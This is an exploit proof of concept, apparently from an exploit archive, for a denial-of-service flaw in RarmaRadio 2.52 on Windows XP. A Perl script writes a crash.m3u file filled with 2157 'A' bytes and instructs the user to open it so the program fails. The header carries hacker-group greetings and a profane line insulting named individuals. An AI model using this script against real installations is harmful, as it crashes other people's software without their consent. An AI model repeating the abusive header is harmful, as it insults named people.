#Title: RarmaRadio (.m3u) Denial of service vulnerability
#Author    :   anT!-Tr0J4n
#Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~all DEV-PoinT t34m
#thanks    :   r0073r ; Sid3^effects ; L0rd CrusAd3r ; all Inj3ct0r 31337 Member
#Home     :   www.Dev-PoinT.com  $ http://inj3ct0r.com
#Software :  http://www.raimersoft.com/rarmaradio.aspx
#Version   :  2.52 Bass 2.4
#Tested on:   Windows XP sp3
 
------------------------------
 
Fuck LAMERZ : X-SHADOW ; ThBa7 ; KloofQ8 ; LeGEnD ; abada -- > fuck you kids
 
------------------------------
 
 
#!/usr/bin/perl
print "| Author: anT!-Tr0J4n      |\n";
print "| Greetz :http://inj3ct0r.com     |\n";
print "|Home : www.Dev-PoinT.com  |\n";
 
my $file = "crash.m3u";
my $junk = "\x41" x 2157;
open($FILE,">$file");
print $FILE $junk;
print "\ncrash.m3u file created successfully\n1.) Open it with RarmaRadio\n2.) Application failure...\n";
close($FILE);